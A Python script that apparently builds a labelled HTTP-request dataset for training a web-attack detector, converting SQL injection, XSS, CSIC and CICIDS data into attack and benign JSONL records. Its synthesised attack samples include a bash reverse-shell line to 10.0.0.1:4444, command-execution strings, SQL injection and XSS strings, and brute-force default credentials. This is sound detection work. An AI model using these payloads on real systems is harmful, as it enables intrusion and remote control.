

import os
import json
import random
import uuid
import logging
import pandas as pd

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, ".."))
DATA_BASE_DIR = os.path.abspath(
    os.environ.get("ML_PIPELINE_DATA_DIR", os.path.join(REPO_ROOT, "data"))
)
RAW_DATA_DIR = os.path.join(SCRIPT_DIR, "..", "..", "ModSecurity", "data", "raw")
OUTPUT_DIR = os.path.join(DATA_BASE_DIR, "curated")

logging.basicConfig(level=logging.WARNING, format="%(levelname)s: %(message)s")
logger = logging.getLogger(__name__)


_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

_INJECTION_MODES = ["query", "body", "header"]


def _base_headers(extra: dict = None) -> dict:
    h = {
        "User-Agent": random.choice(_USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,*/*",
        "Host": "localhost",
    }
    if extra:
        h.update(extra)
    return h


def wrap_payload(payload: str) -> dict:
    
    mode = random.choice(_INJECTION_MODES)

    if mode == "query":
        return {
            "method": "GET",
            "uri": f"/search?q={payload}",
            "headers": _base_headers(),
            "body": "",
        }
    elif mode == "body":
        return {
            "method": "POST",
            "uri": "/submit",
            "headers": _base_headers(
                {"Content-Type": "application/x-www-form-urlencoded"}
            ),
            "body": f"data={payload}",
        }
    else:
        return {
            "method": "GET",
            "uri": "/api/resource",
            "headers": _base_headers({"X-Custom-Input": payload}),
            "body": "",
        }


_REST_ENDPOINTS = [
    ("GET", "/api/users"),
    ("GET", "/api/users/{id}"),
    ("GET", "/api/products"),
    ("GET", "/api/products/{id}"),
    ("GET", "/api/orders"),
    ("GET", "/api/orders/{id}"),
    ("GET", "/api/categories"),
    ("GET", "/api/search?q=laptop"),
    ("GET", "/api/search?q=phone"),
    ("GET", "/api/profile"),
    ("POST", "/api/users"),
    ("POST", "/api/orders"),
    ("PUT", "/api/users/{id}"),
    ("DELETE", "/api/users/{id}"),
]

_STATIC_ASSETS = [
    "/static/css/main.css",
    "/static/css/bootstrap.min.css",
    "/static/js/app.js",
    "/static/js/vendor.js",
    "/static/images/logo.png",
    "/static/images/banner.jpg",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/static/fonts/roboto.woff2",
]

_FORM_ENDPOINTS = [
    ("POST", "/login", "username=alice&password=secret123"),
    ("POST", "/register", "username=bob&email=bob@example.com&password=pass456"),
    ("POST", "/contact", "name=Alice&email=alice@example.com&message=Hello"),
    ("POST", "/checkout", "cart_id=42&payment_method=card"),
    ("POST", "/subscribe", "email=user@example.com"),
    ("POST", "/password-reset", "email=user@example.com"),
    ("POST", "/upload", ""),
    ("POST", "/feedback", "rating=5&comment=Great+service"),
]

_IDS = list(range(1, 200))


def _expand_uri(uri: str) -> str:
    if "{id}" in uri:
        return uri.replace("{id}", str(random.choice(_IDS)))
    return uri


def generate_synthetic_benign(count: int = 600) -> list:
    
    records = []

    for _ in range(count // 3):
        method, uri_tpl = random.choice(_REST_ENDPOINTS)
        uri = _expand_uri(uri_tpl)
        body = ""
        headers = _base_headers()
        if method in ("POST", "PUT"):
            body = "name=test&value=123"
            headers["Content-Type"] = "application/json"
        records.append(
            {
                "request_id": str(uuid.uuid4()),
                "method": method,
                "uri": uri,
                "headers": headers,
                "body": body,
                "label": "benign",
                "attack_family": "benign",
            }
        )

    for _ in range(count // 3):
        asset = random.choice(_STATIC_ASSETS)
        records.append(
            {
                "request_id": str(uuid.uuid4()),
                "method": "GET",
                "uri": asset,
                "headers": _base_headers(),
                "body": "",
                "label": "benign",
                "attack_family": "benign",
            }
        )

    while len(records) < count:
        method, uri, body = random.choice(_FORM_ENDPOINTS)
        headers = _base_headers({"Content-Type": "application/x-www-form-urlencoded"})
        records.append(
            {
                "request_id": str(uuid.uuid4()),
                "method": method,
                "uri": uri,
                "headers": headers,
                "body": body,
                "label": "benign",
                "attack_family": "benign",
            }
        )

    return records




def parse_sentence_label_csv(filepath: str, filename: str, attack_family: str):
    
    df = None
    for enc in ("utf-8", "utf-16", "latin-1"):
        try:
            df = pd.read_csv(filepath, on_bad_lines="skip", encoding=enc)
            break
        except (UnicodeDecodeError, Exception):
            continue
    if df is None:
        logger.warning(
            "Skipping file %s: could not read CSV with any supported encoding", filename
        )
        return

    for row_index, row in df.iterrows():
        if "Sentence" not in df.columns:
            logger.warning(
                "WARNING: Skipping row %s in %s: missing 'Sentence' column",
                row_index,
                filename,
            )
            yield None, True
            continue

        sentence = row.get("Sentence")
        if pd.isna(sentence) or str(sentence).strip() == "":
            logger.warning(
                "WARNING: Skipping row %s in %s: empty or null Sentence",
                row_index,
                filename,
            )
            yield None, True
            continue

        if "Label" not in df.columns:
            logger.warning(
                "WARNING: Skipping row %s in %s: missing 'Label' column",
                row_index,
                filename,
            )
            yield None, True
            continue

        raw_label = row.get("Label")
        try:
            label_int = int(float(str(raw_label).strip()))
        except (ValueError, TypeError):
            logger.warning(
                "WARNING: Skipping row %s in %s: malformed Label value '%s'",
                row_index,
                filename,
                raw_label,
            )
            yield None, True
            continue

        if label_int not in (0, 1):
            logger.warning(
                "WARNING: Skipping row %s in %s: unexpected Label value %s",
                row_index,
                filename,
                label_int,
            )
            yield None, True
            continue

        payload = str(sentence).strip()
        req = wrap_payload(payload)
        is_attack = label_int == 1
        record = {
            "request_id": str(uuid.uuid4()),
            "method": req["method"],
            "uri": req["uri"],
            "headers": req["headers"],
            "body": req["body"],
            "label": "attack" if is_attack else "benign",
            "attack_family": attack_family if is_attack else "benign",
        }
        yield record, False


def parse_cicids_csv(filepath: str, filename: str):
    
    try:
        df = pd.read_csv(filepath, on_bad_lines="skip", encoding="utf-8")
    except UnicodeDecodeError:
        try:
            df = pd.read_csv(filepath, on_bad_lines="skip", encoding="latin-1")
        except Exception as exc:
            logger.warning(
                "WARNING: Skipping file %s: could not read CSV: %s", filename, exc
            )
            return
    except Exception as exc:
        logger.warning(
            "WARNING: Skipping file %s: could not read CSV: %s", filename, exc
        )
        return

    label_col = " Label" if " Label" in df.columns else "Label"
    if label_col not in df.columns:
        logger.warning("WARNING: Skipping file %s: no Label column found", filename)
        return

    LABEL_MAP = {
        "ddos": ("ddos", "flood"),
        "dos goldeneye": ("dos", "flood"),
        "dos hulk": ("dos", "flood"),
        "dos slowhttptest": ("dos", "slowloris"),
        "dos slowloris": ("dos", "slowloris"),
        "heartbleed": ("heartbleed", "heartbleed"),
        "portscan": ("portscan", "portscan"),
        "bot": ("bot", "bot"),
        "ftp-patator": ("brute_force", "ftp_brute"),
        "ssh-patator": ("brute_force", "ssh_brute"),
        "web attack \ufffd brute force": ("brute_force", "web_brute"),
        "web attack \ufffd sql injection": ("sqli", "sqli"),
        "web attack \ufffd xss": ("xss", "xss"),
        "infiltration": ("infiltration", "infiltration"),
    }

    _FLOOD_URIS = ["/", "/index.html", "/api/data", "/search", "/home"]
    _BOT_PAYLOADS = [
        "cmd=whoami",
        "exec=ls+-la",
        "shell=bash+-i+>&+/dev/tcp/10.0.0.1/4444+0>&1",
        "payload=dXNlcjpwYXNz",
        "data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]

    def _synthesise(strategy: str, row: pd.Series) -> tuple[str, str, dict, str]:
        
        dst_port = int(row.get("Destination Port", 80) or 80)
        pkt_len = int(row.get("Max Packet Length", 0) or 0)

        if strategy == "flood":
            return ("GET", random.choice(_FLOOD_URIS), _base_headers(), "")

        if strategy == "slowloris":
            hdrs = _base_headers(
                {"Connection": "keep-alive", "Content-Length": "9999999"}
            )
            return ("POST", "/", hdrs, "")

        if strategy == "heartbleed":
            hdrs = _base_headers({"Accept": "A" * min(pkt_len or 512, 2048)})
            return ("GET", "/", hdrs, "")

        if strategy == "portscan":
            uri = f"/port-{dst_port}"
            return ("GET", uri, _base_headers(), "")

        if strategy == "bot":
            payload = random.choice(_BOT_PAYLOADS)
            hdrs = _base_headers({"Content-Type": "application/x-www-form-urlencoded"})
            return ("POST", "/api/exec", hdrs, payload)

        if strategy == "ftp_brute":
            hdrs = _base_headers({"Content-Type": "application/x-www-form-urlencoded"})
            return ("POST", "/ftp/login", hdrs, "username=admin&password=password123")

        if strategy == "ssh_brute":
            hdrs = _base_headers({"Content-Type": "application/x-www-form-urlencoded"})
            return ("POST", "/ssh/login", hdrs, "username=root&password=toor")

        if strategy == "web_brute":
            hdrs = _base_headers({"Content-Type": "application/x-www-form-urlencoded"})
            return ("POST", "/login", hdrs, "username=admin&password=admin")

        if strategy == "sqli":
            req = wrap_payload("' OR '1'='1")
            return (req["method"], req["uri"], req["headers"], req["body"])

        if strategy == "xss":
            req = wrap_payload("<script>alert(1)</script>")
            return (req["method"], req["uri"], req["headers"], req["body"])

        if strategy == "infiltration":
            hdrs = _base_headers({"Content-Type": "application/octet-stream"})
            return ("POST", "/upload", hdrs, "\\x00\\x01\\x02\\x03" * 16)

        return ("GET", "/", _base_headers(), "")

    for row_index, row in df.iterrows():
        raw_label = str(row.get(label_col, "")).strip()
        if not raw_label or raw_label.lower() == "nan":
            logger.warning(
                "WARNING: Skipping row %s in %s: missing Label",
                row_index,
                filename,
            )
            yield None, True
            continue

        label_lower = raw_label.lower()
        is_benign = label_lower == "benign"

        if is_benign:
            method, uri_tpl = random.choice(_REST_ENDPOINTS)
            uri = _expand_uri(uri_tpl)
            body = ""
            headers = _base_headers()
            if method in ("POST", "PUT"):
                body = "name=test&value=123"
                headers["Content-Type"] = "application/json"
            record = {
                "request_id": str(uuid.uuid4()),
                "method": method,
                "uri": uri,
                "headers": headers,
                "body": body,
                "label": "benign",
                "attack_family": "benign",
            }
            yield record, False
            continue

        family, strategy = None, None
        for key, (fam, strat) in LABEL_MAP.items():
            if key in label_lower:
                family, strategy = fam, strat
                break

        if family is None:
            family = "unknown_attack"
            strategy = "flood"
            logger.warning(
                "WARNING: Unknown CICIDS label '%s' at row %s in %s — mapped to unknown_attack",
                raw_label,
                row_index,
                filename,
            )

        method, uri, headers, body = _synthesise(strategy, row)
        record = {
            "request_id": str(uuid.uuid4()),
            "method": method,
            "uri": uri,
            "headers": headers,
            "body": body,
            "label": "attack",
            "attack_family": family,
        }
        yield record, False


def parse_csic_csv(filepath: str, filename: str):
    
    try:
        df = pd.read_csv(filepath, on_bad_lines="skip")
    except Exception as exc:
        logger.warning("Skipping file %s: could not read CSV: %s", filename, exc)
        return

    required_cols = {"Method", "URL", "classification"}
    missing = required_cols - set(df.columns)
    if missing:
        logger.warning(
            "WARNING: Skipping entire file %s: missing required columns %s",
            filename,
            missing,
        )
        return

    for row_index, row in df.iterrows():
        method = str(row.get("Method", "")).strip()
        url = str(row.get("URL", "")).strip()
        classification = str(row.get("classification", "")).strip()

        if not method or method.lower() == "nan":
            logger.warning(
                "WARNING: Skipping row %s in %s: missing Method",
                row_index,
                filename,
            )
            yield None, True
            continue

        if not url or url.lower() == "nan":
            logger.warning(
                "WARNING: Skipping row %s in %s: missing URL",
                row_index,
                filename,
            )
            yield None, True
            continue

        if not classification or classification.lower() == "nan":
            logger.warning(
                "WARNING: Skipping row %s in %s: missing classification",
                row_index,
                filename,
            )
            yield None, True
            continue

        is_attack = classification.lower() != "normal"

        headers = {}
        ua = str(row.get("User-Agent", "")).strip()
        if ua and ua.lower() != "nan":
            headers["User-Agent"] = ua
        accept = str(row.get("Accept", "")).strip()
        if accept and accept.lower() != "nan":
            headers["Accept"] = accept
        ct = str(row.get("content-type", "")).strip()
        if ct and ct.lower() != "nan":
            headers["Content-Type"] = ct
        cookie = str(row.get("cookie", "")).strip()
        if cookie and cookie.lower() != "nan":
            headers["Cookie"] = cookie
        host = str(row.get("host", "")).strip()
        if host and host.lower() != "nan":
            headers["Host"] = host

        content = row.get("content")
        body = (
            str(content).strip()
            if pd.notna(content) and str(content).strip() not in ("", "nan")
            else ""
        )

        if " HTTP/" in url:
            url = url.split(" HTTP/")[0].strip()

        try:
            from urllib.parse import urlparse

            parsed = urlparse(url)
            uri = parsed.path or "/"
            if parsed.query:
                uri += "?" + parsed.query
        except Exception:
            uri = url

        record = {
            "request_id": str(uuid.uuid4()),
            "method": method,
            "uri": uri,
            "headers": headers,
            "body": body,
            "label": "attack" if is_attack else "benign",
            "attack_family": "unknown_attack" if is_attack else "benign",
        }
        yield record, False




def process_datasets():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    attack_path = os.path.join(OUTPUT_DIR, "attack_requests.jsonl")
    benign_path = os.path.join(OUTPUT_DIR, "benign_requests.jsonl")

    attack_count = 0
    benign_count = 0
    skipped_count = 0

    with (
        open(attack_path, "w", encoding="utf-8") as attack_f,
        open(benign_path, "w", encoding="utf-8") as benign_f,
    ):
        for filename in ("SQLiV3.csv", "sqli.csv", "sqliv2.csv"):
            filepath = os.path.join(RAW_DATA_DIR, filename)
            if not os.path.exists(filepath):
                logger.warning("WARNING: File not found: %s", filepath)
                continue
            print(f"Processing {filename}...")
            for record, skipped in parse_sentence_label_csv(filepath, filename, "sqli"):
                if skipped:
                    skipped_count += 1
                elif record["label"] == "attack":
                    attack_f.write(json.dumps(record) + "\n")
                    attack_count += 1
                else:
                    benign_f.write(json.dumps(record) + "\n")
                    benign_count += 1

        filename = "XSS_dataset.csv"
        filepath = os.path.join(RAW_DATA_DIR, filename)
        if not os.path.exists(filepath):
            logger.warning("WARNING: File not found: %s", filepath)
        else:
            print(f"Processing {filename}...")
            for record, skipped in parse_sentence_label_csv(filepath, filename, "xss"):
                if skipped:
                    skipped_count += 1
                elif record["label"] == "attack":
                    attack_f.write(json.dumps(record) + "\n")
                    attack_count += 1
                else:
                    benign_f.write(json.dumps(record) + "\n")
                    benign_count += 1

        filename = "csic_database.csv"
        filepath = os.path.join(RAW_DATA_DIR, filename)
        if not os.path.exists(filepath):
            logger.warning("WARNING: File not found: %s", filepath)
        else:
            print(f"Processing {filename}...")
            for record, skipped in parse_csic_csv(filepath, filename):
                if skipped:
                    skipped_count += 1
                elif record["label"] == "attack":
                    attack_f.write(json.dumps(record) + "\n")
                    attack_count += 1
                else:
                    benign_f.write(json.dumps(record) + "\n")
                    benign_count += 1

        cicids_files = [
            "Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv",
            "Friday-WorkingHours-Afternoon-PortScan.pcap_ISCX.csv",
            "Friday-WorkingHours-Morning.pcap_ISCX.csv",
            "Monday-WorkingHours.pcap_ISCX.csv",
            "Tuesday-WorkingHours.pcap_ISCX.csv",
            "Wednesday-workingHours.pcap_ISCX.csv",
            "Thursday-WorkingHours-Morning-WebAttacks.pcap_ISCX.csv",
            "Thursday-WorkingHours-Afternoon-Infilteration.pcap_ISCX.csv",
        ]
        for filename in cicids_files:
            filepath = os.path.join(RAW_DATA_DIR, filename)
            if not os.path.exists(filepath):
                logger.warning("WARNING: File not found: %s", filepath)
                continue
            print(f"Processing {filename}...")
            for record, skipped in parse_cicids_csv(filepath, filename):
                if skipped:
                    skipped_count += 1
                elif record["label"] == "attack":
                    attack_f.write(json.dumps(record) + "\n")
                    attack_count += 1
                else:
                    benign_f.write(json.dumps(record) + "\n")
                    benign_count += 1

        print("Generating synthetic benign requests...")
        for record in generate_synthetic_benign(600):
            benign_f.write(json.dumps(record) + "\n")
            benign_count += 1

    print("\nSummary:")
    print(f"  Total attacks written : {attack_count}")
    print(f"  Total benign written  : {benign_count}")
    print(f"  Total rows skipped    : {skipped_count}")


if __name__ == "__main__":
    process_datasets()
